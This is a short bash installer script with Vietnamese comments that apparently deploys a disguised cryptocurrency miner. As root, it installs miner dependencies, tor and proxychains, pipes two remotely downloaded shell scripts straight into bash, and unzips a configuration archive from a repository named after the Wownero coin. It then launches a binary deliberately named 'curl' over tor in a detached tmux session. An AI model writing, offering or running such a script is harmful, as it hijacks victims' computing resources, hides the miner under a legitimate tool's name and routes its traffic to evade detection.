#!/bin/bash

set -x #echo on
if [ -f ${PWD}/curl ]; then
    if pgrep -x "curl" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
sudo proxychains tmux new-session -d -s my_session1 './curl'

fi
exit
fi



sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev tor proxychains -y
sudo wget https://github.com/wowonero/wowo/raw/main/myconfig.zip
wget https://raw.githubusercontent.com/average140421/test/main/1gb.sh
sudo bash 1gb.sh
wget https://raw.githubusercontent.com/average140421/test/main/rdom.sh
sudo bash rdom.sh
sudo unzip myconfig.zip
sudo chmod +x curl
sudo proxychains tmux new-session -d -s my_session1  './curl'
